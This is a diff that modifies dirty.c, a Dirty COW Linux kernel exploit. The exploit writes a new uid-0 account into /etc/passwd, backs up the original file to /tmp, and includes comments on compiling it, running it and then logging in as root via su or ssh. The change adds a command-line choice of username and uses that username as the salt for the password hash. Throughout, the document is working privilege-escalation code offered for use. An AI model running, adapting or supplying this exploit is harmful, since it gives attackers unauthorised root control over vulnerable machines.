@@ -8,16 +8,19 @@
 // created user.
 //
 // To use this exploit modify the user values according to your needs.
-//   The default is "firefart".
+//   The default is "firefart". You can select a new username, see usage below.
 //
 // Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
 //   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//
+// Forked code from:
+//   https://github.com/firefart/dirtycow/blob/master/dirty.c
 //
 // Compile with:
 //   gcc -pthread dirty.c -o dirty -lcrypt
 //
 // Then run the newly create binary by either doing:
-//   "./dirty" or "./dirty my-new-password"
+//   "./dirty" or "./dirty my-new-password or ./dirty my-new-password username"
 //
 // Afterwards, you can either "su firefart" or "ssh firefart@..."
 //
@@ -44,7 +47,7 @@
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "firefart";
+// const char *salt = "firefart";
 
 int f;
 void *map;
@@ -62,7 +65,7 @@ struct Userinfo {
    char *shell;
 };
 
-char *generate_password_hash(char *plaintext_pw) {
+char *generate_password_hash(char *plaintext_pw, char *salt) {
   return crypt(plaintext_pw, salt);
 }
 
@@ -126,25 +129,36 @@ int main(int argc, char *argv[])
     exit(ret);
   }
 
+
   struct Userinfo user;
   // set values, change as needed
-  user.username = "firefart";
+  // user.username = "firefart";
   user.user_id = 0;
   user.group_id = 0;
   user.info = "pwned";
   user.home_dir = "/root";
   user.shell = "/bin/bash";
 
+  char *salt = "firefart";
   char *plaintext_pw;
 
   if (argc >= 2) {
     plaintext_pw = argv[1];
     printf("Please enter the new password: %s\n", plaintext_pw);
+    if (argc == 3) {
+      user.username = argv[2];
+      salt = argv[2];
+    }
+    else {
+      user.username = "firefart";
+    }
+    printf("Selected username is: %s\n", user.username);
   } else {
     plaintext_pw = getpass("Please enter the new password: ");
+    user.username = "firefart";
   }
 
-  user.hash = generate_password_hash(plaintext_pw);
+  user.hash = generate_password_hash(plaintext_pw, salt);
   char *complete_passwd_line = generate_passwd_line(user);
   printf("Complete line:\n%s\n", complete_passwd_line);
 
